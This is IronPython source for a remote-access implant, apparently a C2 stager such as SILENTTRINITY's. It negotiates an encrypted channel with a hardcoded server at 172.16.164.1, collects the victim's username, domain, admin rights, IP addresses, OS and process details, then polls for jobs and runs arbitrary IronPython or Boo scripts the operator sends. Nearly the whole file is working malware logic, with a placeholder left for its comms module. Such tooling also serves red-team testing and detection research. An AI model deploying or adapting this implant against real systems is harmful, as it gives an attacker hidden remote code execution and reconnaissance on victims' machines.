# -*- coding: utf-8 -*-

import clr
from System import Convert, Guid, Environment, Uri, Console, Array, Byte, Random, IntPtr

try:
    assert DEBUG
    clr.AddReference(IronPythonDLL)
except NameError:
    DEBUG = True
    print "Set DEBUG: {}".format(DEBUG)
    try:
        import traceback
    except ImportError:
        print "[!] Error importing traceback module, full tracebacks will not be displayed"
    clr.AddReference("IronPython")

try:
    assert GUID
except NameError:
    GUID = Guid.NewGuid().ToString()
    print "Created GUID: {}".format(GUID)

try:
    assert URL
except NameError:
    URL = Uri(Uri("https://172.16.164.1:5000/"), GUID)
    print "Set URL: {}\n".format(URL)

clr.AddReference("System.Management")
clr.AddReference("System.Web.Extensions")
try:
    clr.AddReference("Microsoft.VisualBasic")
except:
    pass
clr.AddReference("Boo.Lang.Interpreter")
clr.AddReference("BouncyCastle.Crypto")

from System.Text import Encoding
from System.Management import ManagementObject
from System.Diagnostics import Process
from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
from System.IO import StreamReader, Stream, MemoryStream, SeekOrigin
from System.IO.Compression import GZipStream, CompressionMode
from System.Net import HttpWebRequest, WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache, NetworkInformation
from System.Net.Security import RemoteCertificateValidationCallback
from System.Threading import Thread
from System.Security.Cryptography import Aes, PaddingMode, CryptoStream, CryptoStreamMode, AsymmetricAlgorithm, HMACSHA256, RNGCryptoServiceProvider
from System.Threading.Tasks import Task
from System.Web.Script.Serialization import JavaScriptSerializer
try:
    from Microsoft.VisualBasic.Devices import ComputerInfo
except:
    pass
from Microsoft.Win32 import Registry
from IronPython.Hosting import Python
from Boo.Lang.Interpreter import InteractiveInterpreter

from System.Text.RegularExpressions import Regex
from System import StringComparison

from Org.BouncyCastle.Crypto.Parameters import ECKeyGenerationParameters, ECDomainParameters, ECPublicKeyParameters
from Org.BouncyCastle.Security import GeneratorUtilities, SecureRandom, AgreementUtilities
from Org.BouncyCastle.Asn1.Sec import SecNamedCurves, SecObjectIdentifiers
from Org.BouncyCastle.Math import BigInteger
from Org.BouncyCastle.Crypto.Digests import Sha256Digest
from Org.BouncyCastle.Crypto.Agreement import ECDHBasicAgreement

def urljoin(*args):
    return "/".join(map(lambda x: str(x).rstrip('/'), args))


def print_traceback():
    try:
        traceback.print_exc()
    except NameError:
        pass


class EngineStream(Stream):
    def __init__(self):
        self.string = ''

    def Write(self, bytes, offset, count):
        # Turn the byte-array back into a string
        self.string += Encoding.UTF8.GetString(bytes, offset, count)

    @property
    def CanRead(self):
        return False

    @property
    def CanSeek(self):
        return False

    @property
    def CanWrite(self):
        return True

    def Flush(self):
        pass

    def Close(self):
        pass

    @property
    def Position(self):
        return 0


class NotSerializable(Exception):
    pass


class CryptoException(Exception):
    pass


class Serializable(object):
    def __serialize__(self):
        class_dict = {}
        for key in [key for key in self.__dict__.keys() if not key.startswith('__') and key.isupper()]:
            value = getattr(self, key)
            if not callable(value):
                class_dict[key.lower()] = value.__serialize__() if hasattr(value, '__serialize__') else value

        return class_dict


class Crypto(object):
    def __init__(self):
        x9EC = SecNamedCurves.GetByName("secp521r1")
        self.aliceKeyPair = self.GenerateKeyPair(ECDomainParameters(x9EC.Curve, x9EC.G, x9EC.N, x9EC.H, x9EC.GetSeed()))
        self.bobPublicKey = self.GetBobPublicKey(URL, x9EC, self.aliceKeyPair.Public)

        self.derived_key = self.derive_key(self.bobPublicKey, self.aliceKeyPair.Private)

    def GenerateKeyPair(self, ecDomain):
        g = GeneratorUtilities.GetKeyPairGenerator("ECDH")
        g.Init(ECKeyGenerationParameters(ecDomain, SecureRandom()))

        return g.GenerateKeyPair()

    def GetBobPublicKey(self, url, x9EC, alicePublicKey):
        requests = Requests()

        alice_x = str(alicePublicKey.Q.Normalize().AffineXCoord)
        alice_y = str(alicePublicKey.Q.Normalize().AffineYCoord)
        json = "{'x': \"" + alice_x + "\",'y': \"" + alice_y +"\"}"

        response = requests.post(url, Encoding.UTF8.GetBytes(json)).text
        response = response.replace("\"", "'")

        r = Regex("': (.+?) ")
        mcx = r.Matches(response)
        x = BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", ""))

        y = BigInteger(response.Substring(response.LastIndexOf(": ", StringComparison.Ordinal) + 1).Replace("}", "").Trim())

        return ECPublicKeyParameters("ECDH", x9EC.Curve.ValidatePoint(x,y).Normalize(), SecObjectIdentifiers.SecP521r1)

    def derive_key(self, bobPublicKey, alicePrivateKey):
        aKeyAgree = ECDHBasicAgreement()
        aKeyAgree.Init(alicePrivateKey)
        sharedSecretBytes = self.resize_right(aKeyAgree.CalculateAgreement(bobPublicKey).ToByteArray(), 66)

        digest = Sha256Digest()
        symmetricKey = Array.CreateInstance(Byte, digest.GetDigestSize())
        digest.BlockUpdate(sharedSecretBytes, 0, sharedSecretBytes.Length)
        digest.DoFinal(symmetricKey, 0)

        return symmetricKey

    # Resize but pad zeroes to the left instead of to the right like Array.Resize
    def resize_right(self, b, length):
        if b.Length == length:
            return b
        if b.Length > length:
            raise Exception("Invalid size!")
        newB = Array.CreateInstance(Byte, length)
        Array.Copy(b, 0, newB, length - b.Length, b.Length)

        return newB

    def HMAC(self, key, message):
        with HMACSHA256(key) as hmac:
            return hmac.ComputeHash(message)

    def AesEncryptData(self, cleartext, key, iv):
        with Aes.Create() as aesAlg:
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV)

            with MemoryStream() as encryptedData:
                with CryptoStream(encryptedData, encryptor, CryptoStreamMode.Write) as cryptoStream:
                    cryptoStream.Write(cleartext, 0, cleartext.Length)
                    cryptoStream.FlushFinalBlock()
                    return encryptedData.ToArray()

    def AesDecryptData(self, ciphertext, key, iv):
        with Aes.Create() as aesAlg:
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV)

            with MemoryStream() as decryptedData:
                with CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write) as cryptoStream:
                    cryptoStream.Write(ciphertext, 0, ciphertext.Length)
                    cryptoStream.FlushFinalBlock()
                    return decryptedData.ToArray()

    def Encrypt(self, data):
        iv = Array.CreateInstance(Byte, 16)
        RNGCryptoServiceProvider().GetBytes(iv)

        if type(data) != Array[Byte]:
            data = Encoding.UTF8.GetBytes(data)

        ciphertext = self.AesEncryptData(data, self.derived_key, iv)
        hmac = self.HMAC(self.derived_key, iv + ciphertext)

        return iv + ciphertext + hmac

    def Decrypt(self, data):
        iv, ciphertext, hmac = data[:16], data[16:-32], data[-32:]

        if hmac == self.HMAC(self.derived_key, iv + ciphertext):
            return self.AesDecryptData(ciphertext, self.derived_key, iv)

        raise CryptoException("Invalid HMAC when decrypting data")

#
#
# Comms Section
#
#

PUT_COMMS_HERE

#
#
# End Comms Section
#
#


class STJob(Serializable):
    def __init__(self, client, job):
        self.JOB = job
        self.ID = job['id']
        self.STATE = 'Initializing'

        self.__client = client
        self.__t = Task[long](lambda: self.run(job))
        self.__t.Start()

    def run(self, job):
        if DEBUG: print "Running job (id: {})".format(self.ID)

        result = getattr(self, job['cmd'])(job['args'])
        if len(result) > 1000000:
            print "File larger than 1MB ({})".format(len(result))
            with MemoryStream(Encoding.UTF8.GetBytes(result)) as ms:
                bytesRead = 0
                chunk = 0
                buf = Array.CreateInstance(Byte, 1000000)
                nchunk = result.Length / buf.Length

                bytesRead = ms.Read(buf, 0, buf.Length)
                while bytesRead > 0:
                    print "Chunk {}/{} \r".format(chunk, nchunk),
                    buf2 = Array.CreateInstance(Byte, bytesRead)
                    Array.Copy(buf, buf2, buf2.Length)
                    self.send_results(Encoding.UTF8.GetString(buf2), job)
                    bytesRead = ms.Read(buf, 0, buf.Length)
                    chunk += 1

            print "Sending EOF"
            self.send_results("EOF", job)
        else:
            self.send_results(result, job)

    def send_results(self, data, job):
        payload = {'id': self.ID}
        try:
            self.STATE = 'Executed'
            payload['state'] = 'success'
            payload['result'] = data
        except AttributeError as e:
            print_traceback()
            self.STATE = 'Error'
            payload['state'] = 'error'
            payload['result'] = 'Unknown command {}'.format(job['cmd'], e)
        except Exception as e:
            print_traceback()
            self.STATE = 'Error'
            payload['state'] = 'error'
            payload['result'] = 'Exception when executing command {}: {}'.format(job['cmd'], e)

        self.STATE = 'Sending Results'
        self.__client.COMMS.send_job_results(payload, self.ID)
        self.STATE = 'Completed'

    def run_ipy_script(self, args):
        engine_stream = EngineStream()

        engine = Python.CreateEngine()
        engine.Runtime.IO.SetOutput(engine_stream, Encoding.UTF8)
        engine.Runtime.IO.SetErrorOutput(engine_stream, Encoding.UTF8)
        #scope = engine.CreateScope()
        #scope.SetVariable("client", self)

        engine.Execute(args)
        return engine_stream.string

    def run_boo_script(self, args):
        interpreter = InteractiveInterpreter()
        interpreter.Eval(args)
        return interpreter.GetValue("output")

    def get_jobs(self, args):
        return self.__client.JOBS

    def checkin(self, args):
        return self.__client.__serialize__()

    def sleep(self, args):
        self.__client.SLEEP = int(args)
        return "Updated"

    def kill(self):
        self.__t.Stop()

    def __str__(self):
        return "<Job {} ({})>".format(self.ID, self.STATE)

    def __repr__(self):
        return "<Job {} ({})>".format(self.ID, self.STATE)


class STClient(Serializable):
    def __init__(self):
        self.__process = Process.GetCurrentProcess()
        self.__jobs = []

        self.GUID = GUID
        self.SLEEP = 5000
        #self.JITTER = 5000
        self.TYPE = 'ipy'
        self.USERNAME = Environment.UserName
        self.DOMAIN = Environment.UserDomainName
        self.DOTNET_VERSION = str(Environment.Version)
        self.HIGH_INTEGRITY = self.is_high_integrity()
        self.IP = self.get_network_addresses()
        self.OS_ARCH = "x64" if IntPtr.Size == 8 else "x86"

        try:
            self.OS = "{} ({})".format(ComputerInfo().OSFullName, Environment.OSVersion.Version)
        except:
            self.OS = "{} ({})".format(Environment.OSVersion.ToString(), Environment.OSVersion.Version)

        try:
            self.OS_RELEASE_ID = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
        except:
            self.OS_RELEASE_ID = "N/A"

        self.PROCESS = self.__process.Id
        self.PROCESS_NAME = self.__process.ProcessName
        self.HOSTNAME = Environment.MachineName
        self.JOBS = len(self.__jobs)
        self.URL = str(URL)
        self.COMMS = Comms(self)

        self.main()

    def is_high_integrity(self):
        identity = WindowsIdentity.GetCurrent()
        principal = WindowsPrincipal(identity)
        return principal.IsInRole(WindowsBuiltInRole.Administrator)

    def get_network_addresses(self):
        addresses = []
        interfaces = NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
        for iface in interfaces:
            properties = iface.GetIPProperties()
            addresses.extend([uni.Address.ToString() for uni in properties.UnicastAddresses if uni.Address.AddressFamily.ToString() == "InterNetwork" and uni.Address.ToString() != '127.0.0.1'])
        return addresses

    def gen_random_string(self, length=8):
        return Guid.NewGuid().ToString("n").Substring(0, length)

    def main(self):
        while True:
            job = self.COMMS.get_job()
            if job:
                self.__jobs.append(STJob(self, job))

            Thread.CurrentThread.Join(self.SLEEP)
            #Thread.Sleep(client.SLEEP)


STClient()
